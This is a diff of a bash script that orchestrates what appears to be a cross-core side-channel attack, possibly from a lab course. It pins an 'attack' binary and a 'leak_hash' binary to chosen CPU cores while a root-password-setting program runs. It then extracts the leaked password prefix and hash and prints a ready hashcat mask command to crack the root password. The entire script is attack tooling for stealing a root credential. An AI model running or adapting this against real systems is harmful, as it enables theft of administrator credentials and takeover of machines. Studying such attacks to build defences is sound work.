@@ -1,34 +1,30 @@
 #!/bin/bash
 
-# Cleanup function
-cleanup() {
-    echo ""
-    echo "killing processes..."
-    kill -9 $ATTACK_PID 2>/dev/null
-    pkill -9 attack 2>/dev/null
-    wait 2>/dev/null
-    make clean
-    exit 0
-}
-
-# Trap Ctrl+C
-trap cleanup SIGINT SIGTERM
-
 killall attack 2>/dev/null
+killall leak_hash 2>/dev/null
 
-sleep 1
+make all
 
-make
-taskset -c 1,5 ./attack &
-ATTACK_PID=$!
-sleep 1.0
-taskset -c 3 /tmp/set_root_password
+echo
+echo "Running prefix attack..."
 
-echo "Press Ctrl+C to stop"
+taskset -c 1,5 ./attack > prefix_output.txt & (sleep 1 && taskset -c 3 /tmp/set_root_password)
+cat prefix_output.txt
 
-#taskset -c 0,4 ./leak_hash
+# Extract operands
+PREFIX=$(grep "Prefix: " prefix_output.txt | cut -d' ' -f2)
 
+echo
+echo "Running leak hash..."
 
-# Wait forever (until Ctrl+C)
-wait
+taskset -c 0,4 ./leak_hash > leak_output.txt
+cat leak_output.txt
 
+HASH=$(grep "Hash: " leak_output.txt | cut -d':' -f3)
+
+echo
+echo "Run the following command to crack the hash:"
+echo "hashcat -a 3 '${HASH}' '${PREFIX}?h?h?h?h?h?h' --increment-min ${#PREFIX} --increment -w 4"
+
+make clean > /dev/null
+rm prefix_output.txt leak_output.txt
